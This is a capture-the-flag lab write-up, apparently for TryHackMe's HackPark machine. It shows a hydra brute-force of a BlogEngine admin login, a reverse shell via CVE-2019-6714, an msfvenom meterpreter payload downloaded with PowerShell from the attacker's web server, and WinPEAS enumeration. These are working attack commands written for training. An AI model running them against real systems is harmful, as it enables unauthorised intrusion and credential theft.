In this CTF it seems like some excercises in brute forcing and privEsc. 

Task1
---------

We are doing to d some initial recon.

```
root@ip-10-10-144-238:~# nmap -sC -sV -oN hackpark.nmap 10.10.144.46

Starting Nmap 7.60 ( https://nmap.org ) at 2022-10-18 05:08 BST
Nmap scan report for ip-10-10-144-46.eu-west-1.compute.internal (10.10.144.46)
Host is up (0.00043s latency).
Not shown: 998 filtered ports
PORT     STATE SERVICE VERSION
80/tcp   open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| http-methods: 
|_  Potentially risky methods: TRACE
| http-robots.txt: 6 disallowed entries 
| /Account/*.* /search /search.aspx /error404.aspx 
|_/archive /archive.aspx
|_http-server-header: Microsoft-IIS/8.5
|_http-title: hackpark | hackpark amusements
3389/tcp open  ssl     Microsoft SChannel TLS
| fingerprint-strings: 
|   TLSSessionReq: 
|     rv,u
|     hackpark0
|     221017040521Z
|     230418040521Z0
|     hackpark0
|     ;&'f
|     4\xd9
|     ~DDB7
|     2#JG
|     i0/w9
|     DqBa
|     $0"0
|     97OZ
|_    VU}s
| ssl-cert: Subject: commonName=hackpark
| Not valid before: 2022-10-17T04:05:21
|_Not valid after:  2023-04-18T04:05:21
|_ssl-date: 2022-10-18T04:08:50+00:00; 0s from scanner time.
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3389-TCP:V=7.60%I=7%D=10/18%Time=634E26C8%P=x86_64-pc-linux-gnu%r(T
SF:LSSessionReq,33C,"\x16\x03\x03\x037\x02\0\0M\x03\x03cN&\xc3\x17v\xb9\x8
SF:5\xd2\x03\xab\x8f\[\x0e\xd3\xf8\x0f\x0c\x05\xaf\xe9\xad\xaa\xb6<`\x12\x
SF:cd\x06v\x02`\x20\xc6\x19\0\0\x9b\x024l\xe5\x93\xb5rv,u\xca\x84<\xf5u\xa
SF:f\xb5\x01\|\xe1\xfd\x1e\x8ax\xb0\xa0\x07\0/\0\0\x05\xff\x01\0\x01\0\x0b
SF:\0\x02\xde\0\x02\xdb\0\x02\xd80\x82\x02\xd40\x82\x01\xbc\xa0\x03\x02\x0
SF:1\x02\x02\x10L\xe4\xe4\x84T\xe3\x91\x9bB\x83<:\xc6\0\xec\xb10\r\x06\t\*
SF:\x86H\x86\xf7\r\x01\x01\x05\x05\x000\x131\x110\x0f\x06\x03U\x04\x03\x13
SF:\x08hackpark0\x1e\x17\r221017040521Z\x17\r230418040521Z0\x131\x110\x0f\
SF:x06\x03U\x04\x03\x13\x08hackpark0\x82\x01\"0\r\x06\t\*\x86H\x86\xf7\r\x
SF:01\x01\x01\x05\0\x03\x82\x01\x0f\x000\x82\x01\n\x02\x82\x01\x01\0\xc9\x
SF:99\xc6#\x9a-\x08\xf7Y\xe3;&'f\xd54\\\xd9\xd9K\xf0\x8cb\xdc\xbf\x9a\x19\
SF:xc0xIJ\xb8\xea\xa8\xeb\x85\x0f\x0b\xc1\x98\xc5:\x1fNq\x1e\xfd~DD\\B7\x8
SF:3\xf39Qt\xcc\xdb\xf0\x80\x12\x80\"U`\xf7c\x93\x82s\^x\x8f\xa8\^PY\xe9\x
SF:c0&\xac\xee\xbb'\${\xedf\x94\x13\ru\x81L\xa2>\xc0\x02C\xb22#JG\xf64\x96
SF:\x7f\xd1\0Y\xfc\xb7\xe9\x19\xf1r\xbaY\x93\^@\x0c\xcd\xd4\xee;\x82\xefpt
SF:\xe2\xad\xab\x08v\xfe\xc7<\x1ah\xdb5\*Q\x04\x9cu~\xbe\xd2,\xf1\xf9G\xe4
SF:\xf8\xf4\xf7\xf8\xb1\xdc\xf6_\xb7\xab\xd8G-\xa3i0/w9\xa2\$\x94\x9f'\xad
SF:\xe0\xb9\xdd\x98\x0e\xf7;r\xbe_\[\xf72\x1e\xf0\x15\xcb\x0e4\x9c\x8e\xa7
SF:z\)\xee\x82\x8e\x06\x8e\xcb\x12\xf8\xe1\x7f``v\x0fA\0\xa4-#\x9d\"\x86\x
SF:9f\x134F\xc3\xaf\xfe\x88T\xc5\x12\x851\x80\xb7DqBa\x1e\x92\x81\x1dR\xed
SF:\xdd\xdd\x02\x03\x01\0\x01\xa3\$0\"0\x13\x06\x03U\x1d%\x04\x0c0\n\x06\x
SF:08\+\x06\x01\x05\x05\x07\x03\x010\x0b\x06\x03U\x1d\x0f\x04\x04\x03\x02\
SF:x0400\r\x06\t\*\x86H\x86\xf7\r\x01\x01\x05\x05\0\x03\x82\x01\x01\0\xb6\
SF:t\xf4\xe8\xdd\x16G`\r\x8c:\xe6\xf3\x15\x8c\x82\x07\x12J\xe7\x01\x02\x91
SF:\x9b\xd9\xcbg\xba{\x91\"\xc1\x7fg\xb8@\x08I\xd4\x05K\xb4\x8697OZ\x82f\x
SF:8fv3\)\xf2L\xbaJ\x83\]\x88'#\0-\xc1\xef\.\xbe;ku\xe7\xe9\xa1\x07\x86\x0
SF:c\xd6~\x1c~\xba\x91\xd9\*=\xcd\x1e\x89\xf3\]\x17\xb6\xbef\xa1\xd9\x86\x
SF:20\xdf\x95K\xef\x877\[#\xf3\$-\0\x8d\x97/\xc77\x8ag\xb8\xdb\x8a}}\x02\x
SF:b6\xd0\xba\xe8\x0b\x94\xd3\x89\xb4\xf4\xb1\xb6L;\x01v\xadT\xc3!\x18\xa5
SF:JS\xed\x1a\xe8\x20B\xacx\xe8\xf8\x82\*\xff\xe3\xda\xccO\xc8\t\x1c\x05\x
SF:18\xb6{J\x07\xbd\x82\xba\x936{\x20\x0fu\xa8\xe84\xb7q\x1c4z\xd9\xf0\xf3
SF:cxp\xa2\xd9g\xaa\x8b'\x86J\xdc\x03\xafVU}s\xf9\x86\.5\xba\xc2\xa1\xf5\x
SF:85\x84\xbc\x19\\2F\xfa\x13\xeePP\x83-\x19\x06X\xf1\x08\x05\x84\xdfB\xa6
SF:\x7f\xfa\xf2\"\xc9\x96D\xdaH\+\x01zs\x0e\0\0\0");
MAC Address: 02:2F:71:E7:19:8B (Unknown)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.34 seconds
```


So looks like we got a web server on port 80.

Checking that out we see Pennywise on the index, and that's the answer to Task1

Task2
---------
So we see a few directories there, but let's use gobuster and see what all we can find.

```
dirbuster -u http://10.10.144.46 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt > dirbuster-results.txt
```

So one of the things that comes up is robots.txt. To be honest, we probs should always check this kind of things right off the bat since this one if very common.

```
User-agent: *
Disallow: /Account/*.*
Disallow: /search
Disallow: /search.aspx
Disallow: /error404.aspx
Disallow: /archive
Disallow: /archive.aspx

#Remove the '#' character below and replace example.com with your own website address.
#sitemap: http://example.com/sitemap.axd 
# WebMatrix 1.0
```

So another one we find from gobuster is an admin page.

This looks like something we can work with.

This page is made with a tool called 'blogengine.net'. Checking the page I don't see anything indicating a version for the software. I checked the source of the page as well and not really seeing antyhing there indicating a version. 

Might look later to see if any general exploits exist, if this was in the wild, but since they specifically call out Hydra here then that's the direction we are heading.

Let's open Burpsuite first and see what's going on there.

I always think it's a great idea to 1st goto Target->Scope and put in the subnet or host we are scanning so we aren't attacking or looking at the wrong traffic. If you intercept everything it will slow you down a lot.

Once that is setup we go back to the login page for blogengine on this site and just login with admin/admin to intercept.

```
POST /Account/login.aspx?ReturnURL=%2fAdmin HTTP/1.1
Host: 10.10.144.46
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 774
Origin: http://10.10.144.46
Connection: close
Referer: http://10.10.144.46/Account/login.aspx?ReturnURL=%2fAdmin
Upgrade-Insecure-Requests: 1

__VIEWSTATE=QPxePSpLCewDAyaKUN96kYTxf2bQDeZMm%2BAsIxg%2FxBfEH%2B0864bLht64NQDuQkTYN%2BsDpOo%2BeLNZyRl16imhyUtcg0PFqOy%2FAOFYZ62CWSngC48nfY52n5D%2Bm1lNNtF%2FUbSo79c2GzDv%2B%2F3vVvBvBUCy27tshr2I%2F8L5Mq6ZDIAb2Jyl9XGj9DfddcezdIn0b4FRsf1TzxsWby%2FBcWWaD3xZq1b9haCwobl8OyL1q90YB8zP3yPquDmBxTR0le5c5jNJtIDkXlo9f4eDSYJcLbW4F1A%2FHTbuMkKo5%2BBnUlGVuvMQ0hNg%2FmSOoSE8Aus9AE1Fo0igjPdu0jzqJ%2B3DfIzhoZ%2BHfGvIG%2Bf3qdayhzcM4LUn&__EVENTVALIDATION=mIQ%2BFikxszCV%2FnhWXdd1f%2BHE5nd8H82LfJbeYdwA9VDsksw%2BNh9G9c5qK85VeZYom2FafxaZ7osL2FDwihP6JA%2FX6flL5pQMRJyVrzp3HSK19nVf7ooXaN1KFYfNLC9xe8DpV24HRb8E692eJKdNEG4%2BGeQ82zJhXSmzIeip2dP7kLKP&ctl00%24MainContent%24LoginUser%24UserName=admin&ctl00%24MainContent%24LoginUser%24Password=admin&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in
```
So from Burpsuite we need the following:

We'll be using a _POST_ back and this is the answer to the 1st question on Task2.


POST_URL: /Account/login.aspx?ReturnURL=%2fAdmin
SESSION: __VIEWSTATE=QPxePSpLCewDAyaKUN96kYTxf2bQDeZMm%2BAsIxg%2FxBfEH%2B0864bLht64NQDuQkTYN%2BsDpOo%2BeLNZyRl16imhyUtcg0PFqOy%2FAOFYZ62CWSngC48nfY52n5D%2Bm1lNNtF%2FUbSo79c2GzDv%2B%2F3vVvBvBUCy27tshr2I%2F8L5Mq6ZDIAb2Jyl9XGj9DfddcezdIn0b4FRsf1TzxsWby%2FBcWWaD3xZq1b9haCwobl8OyL1q90YB8zP3yPquDmBxTR0le5c5jNJtIDkXlo9f4eDSYJcLbW4F1A%2FHTbuMkKo5%2BBnUlGVuvMQ0hNg%2FmSOoSE8Aus9AE1Fo0igjPdu0jzqJ%2B3DfIzhoZ%2BHfGvIG%2Bf3qdayhzcM4LUn&__EVENTVALIDATION=mIQ%2BFikxszCV%2FnhWXdd1f%2BHE5nd8H82LfJbeYdwA9VDsksw%2BNh9G9c5qK85VeZYom2FafxaZ7osL2FDwihP6JA%2FX6flL5pQMRJyVrzp3HSK19nVf7ooXaN1KFYfNLC9xe8DpV24HRb8E692eJKdNEG4%2BGeQ82zJhXSmzIeip2dP7kLKP&ctl00%24MainContent%24LoginUser%24UserName=admin&ctl00%24MainContent%24LoginUser%24Password=admin&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in

UserName:
Password:
Failed Message: Login Failed

So we can now construct what our hydra will use:

```
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.146.46 http-post-form "Account/login.aspx?ReturnURL=/Admin:__VIEWSTATE=QPxePSpLCewDAyaKUN96kYTxf2bQDeZMm%2BAsIxg%2FxBfEH%2B0864bLht64NQDuQkTYN%2BsDpOo%2BeLNZyRl16imhyUtcg0PFqOy%2FAOFYZ62CWSngC48nfY52n5D%2Bm1lNNtF%2FUbSo79c2GzDv%2B%2F3vVvBvBUCy27tshr2I%2F8L5Mq6ZDIAb2Jyl9XGj9DfddcezdIn0b4FRsf1TzxsWby%2FBcWWaD3xZq1b9haCwobl8OyL1q90YB8zP3yPquDmBxTR0le5c5jNJtIDkXlo9f4eDSYJcLbW4F1A%2FHTbuMkKo5%2BBnUlGVuvMQ0hNg%2FmSOoSE8Aus9AE1Fo0igjPdu0jzqJ%2B3DfIzhoZ%2BHfGvIG%2Bf3qdayhzcM4LUn&__EVENTVALIDATION=mIQ%2BFikxszCV%2FnhWXdd1f%2BHE5nd8H82LfJbeYdwA9VDsksw%2BNh9G9c5qK85VeZYom2FafxaZ7osL2FDwihP6JA%2FX6flL5pQMRJyVrzp3HSK19nVf7ooXaN1KFYfNLC9xe8DpV24HRb8E692eJKdNEG4%2BGeQ82zJhXSmzIeip2dP7kLKP&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login Failed" -vv
```

after some time you should get a hit:
[80][http-post-form] host: 10.10.146.46    login: admin    password: 1qaz2wsx

So the answer to the next question is: _1qaz2wsx_

Task3
----------

Login to the webportal/Admin page using our newfound creds and go admin/about/cshtml

It will show a lot of details about this site including the answer to the 1st question: Version _3.3.6.0_

Scanning for exploits we find this:
https://www.exploit-db.com/exploits/46353

The CVE is the answer to our next question:
_CVE-2019-6714_

Now we have a shell

```
# nc -nlvp 443
Listening on [0.0.0.0] (family 0, port 443)
Connection from 10.10.144.46 49308 received!
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>

```

Find the answer to the last question in Task3:

```
c:\windows\system32\inetsrv>
whoami
c:\windows\system32\inetsrv>whoami
iis apppool\blog
```
_iis apppool\blog_

```
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.10.203.213 LPORT=4444 -f exe -o backdoor.exe
```

Start a simple webserver to host this binary:

```
python3 -m http.server 8000
```

Then back in our shell we can execute the following Powershell to pull our new backdoor.

```
powershell -c "Invoke-WebRequest -Uri 'http://10.10.203.213:8000/backdoor.exe' -OutFile 'C:\Windows\Temp\backdoor2.exe'""
```

Next setup msfconole mutli/handler to catch our new shell with:

msfconsole:

```
     =[ metasploit v5.0.101-dev                         ]
+ -- --=[ 2048 exploits - 1105 auxiliary - 344 post       ]
+ -- --=[ 566 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

Metasploit tip: View advanced module options with advanced

msf5 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
msf5 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > set LHOST 10.10.203.213
LHOST => 10.10.203.213
msf5 exploit(multi/handler) > set LPORT 4444
LPORT => 4444
msf5 exploit(multi/handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.203.213    yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf5 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.203.213:4444 

```

Now on our shell just run:
```
C:\Windows\Temp> backdoor.exe
```

Give it a sec and it should complete our new meterpreter shell:
```
[*] Sending stage (176195 bytes) to 10.10.144.46
[*] Meterpreter session 1 opened (10.10.203.213:4444 -> 10.10.144.46:49363) at 2022-10-18 07:27:02 +0100

meterpreter > 
meterpreter > sysinfo
Computer        : HACKPARK
OS              : Windows 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows
```

Answer to Second Question:
_Windows 2012 R2 (6.3 Build 9600)_

Let's see what privs we have:

```
C:\Windows\Temp>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

```

Well We have Impersonate priviledges. Great.

```
meterpreter > ps

Process List
============

 PID   PPID  Name                  Arch  Session  User              Path
 ---   ----  ----                  ----  -------  ----              ----
 0     0     [System Process]                                       
 4     0     System                                                 
 368   4     smss.exe                                               
 520   512   csrss.exe                                              
 576   564   csrss.exe                                              
 584   512   wininit.exe                                            
 628   564   winlogon.exe                                           
 672   584   services.exe                                           
 680   584   lsass.exe                                              
 740   672   svchost.exe                                            
 784   672   svchost.exe                                            
 868   628   dwm.exe                                                
 876   672   svchost.exe                                            
 892   3056  WScheduler.exe                                         
 904   672   svchost.exe                                            
 944   672   svchost.exe                                            
 964   672   svchost.exe                                            
 1020  672   svchost.exe                                            
 1140  672   spoolsv.exe                                            
 1168  672   amazon-ssm-agent.exe                                   
 1248  672   svchost.exe                                            
 1268  672   LiteAgent.exe                                          
 1348  672   svchost.exe                                            
 1384  672   svchost.exe                                            
 1412  672   WService.exe                                           
 1480  1700  cmd.exe               x64   0        IIS APPPOOL\Blog  C:\Windows\System32\cmd.exe
 1556  1412  WScheduler.exe                                         
 1656  672   Ec2Config.exe                                          
 1700  1384  w3wp.exe              x64   0        IIS APPPOOL\Blog  C:\Windows\System32\inetsrv\w3wp.exe
 1748  740   WmiPrvSE.exe                                           
 1760  892   Message.exe                                            
 2016  672   svchost.exe                                            
 2088  2556  backdoor2.exe         x86   0        IIS APPPOOL\Blog  C:\Windows\Temp\backdoor2.exe
 2344  2556  conhost.exe           x64   0        IIS APPPOOL\Blog  C:\Windows\System32\conhost.exe
 2360  672   msdtc.exe                                              
 2420  1480  conhost.exe           x64   0        IIS APPPOOL\Blog  C:\Windows\System32\conhost.exe
 2500  904   taskhostex.exe                                         
 2556  1700  cmd.exe               x64   0        IIS APPPOOL\Blog  C:\Windows\System32\cmd.exe
 2560  2532  explorer.exe                                           
 2712  1480  backdoor.exe          x86   0        IIS APPPOOL\Blog  C:\Windows\Temp\backdoor.exe
 3004  2492  ServerManager.exe                                      

meterpreter > 
```

So looks like WindowScheduler is running and that makes it easy to replace and put our our stuff to run on a schedule.

Answer to 3rd Question: _WindowsScheduler_

So looking under 
```
C:\Program Files (x86)\SystemScheduler\Events

cat 20198415519.INI_LOG.txt 

[---]
10/17/22 23:53:02,Event Started Ok, (Administrator)
10/17/22 23:53:34,Process Ended. PID:1916,ExitCode:4,Message.exe (Administrator)
10/17/22 23:54:01,Event Started Ok, (Administrator)
10/17/22 23:54:34,Process Ended. PID:1872,ExitCode:4,Message.exe (Administrator) 
```

We see a lot of messages repeated about a process called Message.exe run by 'Administrator' every 30 seconds. Looks like that is our target.

So that's the answer to our 4th Question: _Message.exe_

The last thing to do is move into our 

```
C:\Program Files (x86)\
```

```
C:\Users\jeff\Desktop>type user.txt
type user.txt
759bd8af507517bcfaede78a21a73e39
C:\Users\jeff\Desktop>

```

Question 4 Answer: _759bd8af507517bcfaede78a21a73e39_


Then finally over to Administrator\Desktop:

```
C:\Users\Administrator\Desktop>type root.txt
type root.txt
7e13d97f05f7ceb9881a3eb3d78d3e72
```

Question 5 Answer: _7e13d97f05f7ceb9881a3eb3d78d3e72_

Task 5
-----------

Pull WinPEAS from here:
https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASbat

Upload it to ```
```
C:\Windows\Temp
```

as you did the other ones.

Then from your shell again you can pull down the winPEAS.bat:

```
powershell -c "Invoke-WebRequest -Uri 'http://10.10.203.213:8000/winPEAS.bat' -OutFile 'C:\Windows\Temp\winpeas.bat'""
```

Then just run it to get the info you need, like the System Install Date for the final question.

```
C:\Windows\Temp> winpeas.bat
```


Winpeas Original Intall Date:

	Original Install Date:      8/3/2019, 10:43:23 AM

Final Answer: _8/3/2019, 10:43:23 AM_

Conclusion:
--------------------

This one was a bit tricky. I had some original issues figuring out the syntax for the POST and the webtoken for hydra, due to some mispelled word. 

I find over and over again that these flaky shells and things are unforgiving if you mistype something so the main lesson is be careful what you type. If you fudge it up in the real world, you may never get another shot if you corrupt something. Restarting a machine is easy on THM, but you'd almost certainly never get another chance IRL.

The other issue I had was trying to figure out what 'service' was running that we wanted to exploit. I typed it in the 1st time, and THM said that wasn't it. So I'm like HUH? And then tried a few others. Then I realized again I fat fingered the original one. :P  I digress to Lesson #1 above haha.

